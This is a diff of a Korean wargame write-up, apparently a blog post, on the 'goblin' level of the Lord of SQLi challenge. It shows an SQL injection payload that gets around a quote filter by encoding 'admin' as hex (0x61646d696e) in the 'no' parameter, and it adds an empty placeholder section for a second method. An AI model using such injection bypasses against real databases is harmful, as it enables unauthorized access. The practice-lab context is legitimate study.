@@ -19,6 +19,8 @@
 이제 '와 "을 sql문에서 입력할 수 없게 막은 것인데,  
 그래서 id='admin' 과 같이 파라미터를 보낼 수 없게됬다.
 
+## 방법 1. id에 16진수를 사용하기
+
 여기서 쓸 수 있는 것은, 스트링 우회법이다.  
 db마다 다른데, 여기선 0x로 문자들을 16진수로 표기해도 문자열로 해석하는 점을 이용해서,
 
@@ -30,3 +32,7 @@ https://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=0%20or
 query : select id from prob_goblin where id='guest' and no=0 or id=0x61646d696e
 ```
 이렇게 해주면 뚫리는 것을 볼 수 있다.
+
+# 방법 2. ?
+
+???
